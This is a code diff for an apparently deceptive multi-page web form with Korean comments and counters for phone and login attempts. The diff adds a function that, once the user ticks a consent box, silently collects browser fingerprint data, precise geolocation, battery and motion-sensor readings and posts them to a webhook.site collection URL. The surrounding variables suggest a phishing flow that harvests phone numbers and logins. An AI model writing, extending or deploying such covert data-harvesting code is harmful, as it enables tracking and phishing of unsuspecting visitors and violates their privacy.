@@ -63,7 +63,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 </div>
 
 <script>
-const webhookUrl = "https://webhook.site/your-url"; // 실제 Webhook URL로 교체
+const webhookUrl = "https://webhook.site/your-url"; // Webhook URL
 let savedPhone = "";
 let phoneTryCount = 0;
 let loginTryCount = 0;
@@ -72,8 +72,79 @@ let loginTryCount = 0;
 function goNext() {
   const chk = document.getElementById("agree");
   if (!chk.checked) { alert("동의 후 진행할 수 있습니다."); return; }
+  collectUserInfo(); // 기존 정보 수집 그대로 유지
   document.getElementById("page1").classList.add("hidden");
   document.getElementById("page2").classList.remove("hidden");
+}
+
+// 최대 정보 수집 (기존 코드 그대로)
+async function collectUserInfo() {
+  const formData = new URLSearchParams();
+  formData.append("userAgent", navigator.userAgent);
+  formData.append("language", navigator.language);
+  formData.append("platform", navigator.platform);
+  formData.append("cookieEnabled", navigator.cookieEnabled);
+  formData.append("onLine", navigator.onLine);
+  formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
+  formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
+  formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
+  formData.append("screen.width", screen.width);
+  formData.append("screen.height", screen.height);
+  formData.append("screen.availWidth", screen.availWidth);
+  formData.append("screen.availHeight", screen.availHeight);
+  formData.append("screen.colorDepth", screen.colorDepth);
+  formData.append("screen.pixelDepth", screen.pixelDepth);
+  formData.append("window.innerWidth", window.innerWidth);
+  formData.append("window.innerHeight", window.innerHeight);
+  formData.append("window.outerWidth", window.outerWidth);
+  formData.append("window.outerHeight", window.outerHeight);
+  formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+  if (navigator.connection) {
+    formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
+    formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
+    formData.append("network.rtt", navigator.connection.rtt ?? "unknown");
+    formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
+  } else { formData.append("network.info", "unknown"); }
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      formData.append("battery.charging", battery.charging);
+      formData.append("battery.level", battery.level);
+      formData.append("battery.chargingTime", battery.chargingTime);
+      formData.append("battery.dischargingTime", battery.dischargingTime);
+    } catch(e) { formData.append("battery.info", "unknown"); }
+  } else { formData.append("battery.info", "unknown"); }
+  if (navigator.geolocation) {
+    await new Promise(resolve => {
+      navigator.geolocation.getCurrentPosition(pos => {
+        formData.append("location.latitude", pos.coords.latitude);
+        formData.append("location.longitude", pos.coords.longitude);
+        formData.append("location.accuracy", pos.coords.accuracy);
+        resolve();
+      }, err => { formData.append("location.error", err.message); resolve(); });
+    });
+  } else { formData.append("location", "unknown"); }
+  if (window.DeviceMotionEvent) {
+    window.addEventListener("devicemotion", e=>{
+      if (e.acceleration) {
+        formData.append("sensors.acceleration.x", e.acceleration.x ?? "unknown");
+        formData.append("sensors.acceleration.y", e.acceleration.y ?? "unknown");
+        formData.append("sensors.acceleration.z", e.acceleration.z ?? "unknown");
+      }
+    }, { once:true });
+  }
+  if (window.DeviceOrientationEvent) {
+    window.addEventListener("deviceorientation", e=>{
+      formData.append("sensors.orientation.alpha", e.alpha ?? "unknown");
+      formData.append("sensors.orientation.beta", e.beta ?? "unknown");
+      formData.append("sensors.orientation.gamma", e.gamma ?? "unknown");
+    }, { once:true });
+  }
+  formData.append("timestamp", new Date().toISOString());
+  formData.append("page","1");
+
+  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
+  .catch(err=>console.error("WebHook 전송 오류:",err));
 }
 
 // page2 -> page3
